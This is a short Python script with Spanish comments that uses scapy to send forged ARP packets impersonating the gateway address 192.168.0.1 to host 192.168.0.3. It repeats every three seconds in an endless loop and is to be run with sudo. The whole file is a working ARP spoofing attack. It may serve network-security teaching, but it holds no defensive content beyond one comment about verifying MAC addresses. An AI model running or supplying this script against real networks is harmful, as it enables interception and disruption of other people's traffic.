#! /usr/bin/env python
## -*- coding: latin-1 -*-
#
# ejecutar con sudo 
# psrc=ip puerta enlace, pdst=ip destinatario, hwdst=mac inventada
# al llegar a una estación siempre verifique su dirección mac
# ARP Address Resolution Protocol
from scapy.all import *
s=ARP (op="who-has", psrc="192.168.0.1", pdst="192.168.0.3", hwdst="00:1e:d7:e2:d1:dc")
send(s, inter=3, loop=1)
